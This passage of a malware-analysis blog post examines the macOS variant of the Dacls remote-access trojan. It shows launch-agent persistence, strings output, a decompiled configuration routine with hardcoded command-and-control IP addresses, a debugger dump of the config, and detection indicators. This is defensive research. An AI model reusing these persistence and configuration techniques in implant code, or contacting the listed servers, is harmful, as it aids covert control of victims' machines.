<p>As the value for the <code>RunAtLoad</code> key is set to <code>true</code> the malware will be automatically (re)started by macOS each time the system is rebooted (and the user logs in).</p>
<div class="note">
üìù If the malware finds itself running with root privileges it will persist to:
<br>
<br>
<center>/Library/LaunchDaemons/com.aex-loop.agent.plist</center>
</div>
<p>Ok, so now we understand how the malware persists, let&rsquo;s briefly discuss its capabilities.</p>
<h3 id="capabilities">Capabilities</h3>
<p>So far we know that the trojanized <code>TinkaOTP.app</code> installs a binary to <code>~/Library/.mina</code>, and persists it as a launch item.</p>
<p>&hellip;but what does <code>.mina</code> actually do? The good news (for me as a somewhat lazy malware analyst), is that this has already be answered!</p>
<p>Running the <code>strings</code> command on the <code>.mina</code> binary reveals some interesting, well, strings:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ strings -a ~/Library/.mina

c_2910.cls
k_3872.cls

http:/
POST /%s HTTP/1.0
Host: %s
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7

/Library/Caches/com.apple.appstore.db

/proc
/proc/%d/task
/proc/%d/cmdline
/proc/%d/status

wolfCrypt Operation Pending (would block / eagain) error
wolfCrypt operation not pending error

</pre>
</div>
<p>When analyzing an unknown malicious piece of software it&rsquo;s (generally) a good idea to Google interesting strings, as this can turn up related files, or even better, previous analysis reports. Here we luck out, as the latter holds!</p>
<img src="../images/blog/blog_0x57/google.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>The <code>c_2910.cls</code> string matches on a report for a Lazarus Group cross-platform RAT named <code>Dacls</code> &hellip;and as we&rsquo;ll see other strings, and functionality (as well as input by other security researchers) confirm this.</p>
<div class="note">
<p>üìù The noted Mac Malware Analyst <a href="https://twitter.com/thomasareed/">Thomas Reed</a>, is (AFAIK) the first to identify this specimen, and note that it was a &ldquo;Mac variant of Dacls RAT&rdquo;
<br>
<br></p>
<center><img src="../images/blog/blog_0x57/reed.png"  width="100%" class="center" style="border-radius: 4px;">
<center style="color:#787878; padding-top:5px;"> </center>
</center>
</div>
<p>The initial report on the <code>Dacls</code> RAT, was published in December 2019, by Netlab. Titled, <a href="https://blog.netlab.360.com/dacls-the-dual-platform-rat-en/">&ldquo;Dacls, the Dual platform RAT&rdquo;</a>, it comprehensively covers both the Windows and Linux variants of this RAT (as well as notes, &ldquo;<i>we speculate that the attacker behind Dacls RAT is Lazarus Group</i>&rdquo;).</p>
<p>&hellip;however there is no mention of a macOS variant!
As such, this specimen appears to be the first macOS variant of <code>Dacls</code> (and thus also, this post, the first analysis)!</p>
<p>As noted, the Netlab <a href="https://blog.netlab.360.com/dacls-the-dual-platform-rat-en/">report</a> provides a thorough analysis of the RATs capabilities on Windows/Linux. As such, we won&rsquo;t duplicate said analysis, but instead will confirm that this specimen is indeed a macOS variant of <code>Dacls</code>, as well as note a few macOS-specific nuances/IOCs.</p>
<p>Looking at the disassembly of the malware&rsquo;s <code>main</code> function, after the malware persists, it invokes a function named <code>InitializeConfiguration</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Objective-C" data-lang="Objective-C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">InitializeConfiguration</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>  rax <span style="color:#f92672">=</span> time(<span style="color:#f92672">&amp;</span>var_18);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>  srand(rax);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>  <span style="color:#66d9ef">if</span> (LoadConfig(_g_mConfig) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>  {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    __bzero(_g_mConfig, <span style="color:#ae81ff">0x8e14</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>    rax <span style="color:#f92672">=</span> rand();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    <span style="color:#f92672">*</span>(int32_t <span style="color:#f92672">*</span>)_g_mConfig <span style="color:#f92672">=</span> ((SAR((sign_extend_32(rax) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0xffffffff80000081</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x20</span>) 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    <span style="color:#f92672">+</span> sign_extend_32(rax), <span style="color:#ae81ff">0x17</span>)) <span style="color:#f92672">+</span> ((sign_extend_32(rax) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0xffffffff80000081</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x20</span>) 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>    <span style="color:#f92672">+</span> sign_extend_32(rax) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x1f</span>) <span style="color:#f92672">-</span> ((SAR((sign_extend_32(rax) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0xffffffff80000081</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x20</span>) 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    <span style="color:#f92672">+</span> sign_extend_32(rax), <span style="color:#ae81ff">0x17</span>)) <span style="color:#f92672">+</span> ((sign_extend_32(rax) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0xffffffff80000081</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x20</span>) 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>    <span style="color:#f92672">+</span> sign_extend_32(rax) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x1f</span>) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0x18</span>)) <span style="color:#f92672">+</span> sign_extend_32(rax);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>    <span style="color:#f92672">*</span><span style="color:#ae81ff">0x10009c3c8</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1343b8400030100</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>    <span style="color:#f92672">*</span>(int32_t <span style="color:#f92672">*</span>)dword_10009c42c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>    mata_wcscpy(<span style="color:#ae81ff">0x10009c430</span>, u<span style="color:#e6db74">&#34;67.43.239.146:443&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>    mata_wcscpy(<span style="color:#ae81ff">0x10009cc30</span>, u<span style="color:#e6db74">&#34;185.62.58.207:443&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>    mata_wcscpy(<span style="color:#ae81ff">0x10009d430</span>, u<span style="color:#e6db74">&#34;185.62.58.207:443&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>    <span style="color:#f92672">*</span>(int32_t <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x10009c3d0</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>    rax <span style="color:#f92672">=</span> SaveConfig(_g_mConfig);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>  }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>          rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>  }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span>  <span style="color:#66d9ef">return</span> rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span>}</span></span></code></pre></div>
<p>After seeding the random number generator, the malware invokes a function named <code>LoadConfig</code>. In short, the <code>LoadConfig</code> function attempts to load a configuration file from <code>/Library/Caches/com.apple.appstore.db</code>. If found, it decrypts the configuration via a call to the <code>AES_CBC_decrypt_buffer</code> function. If the configuration is not found, it returns a non-zero error.</p>
<p>Looking at the code in <code>InitializeConfiguration</code> we can see that if <code>LoadConfig</code> fails (i.e. no configuration file is found), code within <code>InitializeConfiguration</code> will generate a default configuration, which is then saved via a call to the <code>SaveConfig</code> function.</p>
<p>We can see three IP addresses (two unique) that are part of the default configuration: <code>67.43.239.146</code> and <code>185.62.58.207</code>. These as the default command &amp; control servers.</p>
<p>Returning to the Netlab <a href="https://blog.netlab.360.com/dacls-the-dual-platform-rat-en/">report</a>, it states:</p>
<blockquote>
<p>&ldquo;<i>The Linux.Dacls Bot configuration file is stored at $HOME/.memcache, and the file content is 0x8E20 + 4 bytes. If Bot cannot find the configuration file after startup, it will use AES encryption to generate the default configuration file based on the hard-coded information in the sample. After successful Bot communicates with C2, the configuration file will get updated.</i>&rdquo;</p>
</blockquote>
<p>It appears the macOS variant of <code>Dacls</code> contains this same logic (albiet the config file is stored in <code>/Library/Caches/com.apple.appstore.db</code>).</p>
<p>The Netlab researchers also breakdown the format of the configuration file (image credit: Netlab):</p>
<img src="../images/blog/blog_0x57/linuxConfig.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>Does our macOS variant conform to this format? Yes it appears so:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

(lldb) x/i $pc
->  0x100004c4c: callq  0x100004e20 ; SaveConfig(tagMATA_CONFIG*)

(lldb) x/192xb $rdi
0x10009c3c4: 0xcc 0x37 0x86 0x00 0x00 0x01 0x03 0x00
0x10009c3cc: 0x84 0x3b 0x34 0x01 0x02 0x00 0x00 0x00
0x10009c3d4: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c3dc: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c3e4: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c3ec: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c3f4: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c3fc: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c404: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c40c: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c414: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c41c: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c424: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c42c: 0x03 0x00 0x00 0x00 0x36 0x00 0x37 0x00
0x10009c434: 0x2e 0x00 0x34 0x00 0x33 0x00 0x2e 0x00
0x10009c43c: 0x32 0x00 0x33 0x00 0x39 0x00 0x2e 0x00
0x10009c444: 0x31 0x00 0x34 0x00 0x36 0x00 0x3a 0x00
0x10009c44c: 0x34 0x00 0x34 0x00 0x33 0x00 0x00 0x00
0x10009c454: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c45c: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c464: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c46c: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c474: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x10009c47c: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00

</pre>
</div>
<p>This means we can also extract the (build?) date from the default configuration (offset 0x8): <code>0x84 0x3b 0x34 0x01</code>
&hellip;which converts to 0x01343b84 -&gt; 20200324d (March 24th, 2020).</p>
<p>The Netlab <a href="https://blog.netlab.360.com/dacls-the-dual-platform-rat-en/">report</a> also highlights the fact that <code>Dacls</code> utilizes a modular plugin architecture:</p>
<blockquote>
<p>&ldquo;<i>[Dacls] uses static compilation to compile the plug-in and Bot code together. By sending different instructions to call different plug-ins, various tasks can be completed.</i>&rdquo;</p>
</blockquote>
<p>&hellip;the report describes various plugins such as a file plugin, a process plugin, a test plugin, a &ldquo;reverse P2P&rdquo; plugin, and a &ldquo;LogSend&rdquo; plugin. The macOS variant of <code>Dacls</code> supports these plugins (and perhaps an addition one or two, i.e. SOCKS):</p>
<img src="../images/blog/blog_0x57/plugins.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>At this point, we can readily conclude that the specimen we&rsquo;re analyzing is clearly a macOS variant of the <code>Dacls</code> implant. Preliminary analysis and similarity to the Linux variant indicates this affords remote attackers the ability to fully control an infected system, and the implant supports the ability to:</p>
<ul>
<li>execute system commands</li>
<li>upload/download, read/write, delete files</li>
<li>listing, creating, terminating processes</li>
<li>network scanning</li>
</ul>
<blockquote>
<p>&ldquo;<i>The main functions of &hellip;Dacls Bot include: command execution, file management, process management, test network access, C2 connection agent, network scanning module.</i>&rdquo; -Netlab</p>
</blockquote>
<h3 id="detection">Detection</h3>
<p>Though <code>OSX.Dacls</code> is rather feature complete, it is trivial to detect via behavior-based tools &hellip;such as the <a href="https://objective-see.com/products.html">free ones</a>, created by yours truly!</p>
<p>For example, <a href="https://objective-see.com/products/blockblock.html">BlockBlock</a> readily detects the malware&rsquo;s launch item persistence:</p>
<img src="../images/blog/blog_0x57/BlockBlock.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>While <a href="https://objective-see.com/products/lulu.html">LuLu</a> detects the malware&rsquo;s unauthorized network communications to the attackers&rsquo; remote command &amp; control server:</p>
<img src="../images/blog/blog_0x57/LuLu.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>Finally, <a href="https://objective-see.com/products/knockknock.html">KnockKnock</a> can generically detect if a macOS system is infected with <code>OSX.Dacls</code>, by detecting it&rsquo;s launch item persistence:</p>
<img src="../images/blog/blog_0x57/KnockKnock.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>To manually detect <code>OSX.Dacls</code> look for the presence of the following files:</p>
<ul>
<li><code>~/Library/LaunchAgents/com.aex.lop.agent.plist</code></li>
<li><code>/Library/LaunchDaemons/com.aex.lop.agent.plist</code></li>
<li><code>/Library/Caches/com.apple.appstore.db</code></li>
<li><code>~/Library/.mina</code></li>
</ul>
<p>If you system is infected, as the malware provide complete command and control over an infected system, best to assume your 100% owned, and fully reinstall macOS!</p>
<h3 id="conclusion">Conclusion</h3>
<p>Today, we analyzed the macOS variant of <code>OSX.Dacls</code>, highlighting its installation logic, persistence mechanisms, and capabilities (noting the clear similarities to its Linux-version).</p>
<p>Though it can be somewhat worrisome to see APT groups developing and evolving their macOS capabilities, our <a href="https://objective-see.com/products.html">free</a> security tools can help thwart these threats &hellip;even with no a priori knowledge! üõ†Ô∏è üòá</p>
<br>
<div class="note">
<center>
‚ù§Ô∏è Love these blog posts and/or want to support my research and tools? 
<p>You can support them via my <a href="https://www.patreon.com/bePatron?c=701171">Patreon</a> page!</p>
</center></div>
</section>

    </div>

    
<script src="/js/cookies.js"></script>
<script src="/social/ss-social.js"></script>
<link href="/social/ss-social.css" rel="stylesheet" />

<script> 
    $(function(){
        
        
        
        if("" == getCookie("acceptedCookies")) 
        {
            console.log('ok showing!')

            document.getElementById("cookies").style.display = "block";
        }

    });
</script>

<script>
function acceptCookies() {

    
    setCookie("acceptedCookies", "yes", 365);

    
    document.getElementById("cookies").style.display = "none";
}
</script>

<br>
<br>
<div id="cookies" class="cookie" style="padding-left:20px;">
    This website uses cookies to improve your experience.
    <div class="cookieButton">
        
        <button class="menuicon button-4" role="button" onclick="acceptCookies()" style="margin-top: 12px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Okay!</button>
    </div>
</div>
<nav role="footer">
<ul>

    <li>
        <a href="mailto:contact@objective-see.com" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#x2709;</span></a>
    </li>

     <li>
        <a href="rss.xml" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xE310;</span></a>
    </li>

    <li>
        <a href="https://www.youtube.com/channel/UCQycc8VDhHuNkZlKSSTDHzw" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xF630;</span></a>
    </li>
   
    <li>
        <a href="https://twitter.com/objective_see" class="menubutton icon"><span class="ss-icon">&#xF611;</span></a>
    </li>
    
    <li>
         <form action="support.html" style="display: inline;">
            <button class="menuicon button-4" role="button" style="margin-top: 7px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Support Us!</button>
        </form>
        
    </li>

    <li>
        <div style="margin-top: 10px;">
        Signup for our <a class="inlineLink" target="_blank" href="http://eepurl.com/bXpXeT">newsletter </a> ¬ª
        </div>
    </li>

</ul>
</nav>

  </body>
</html>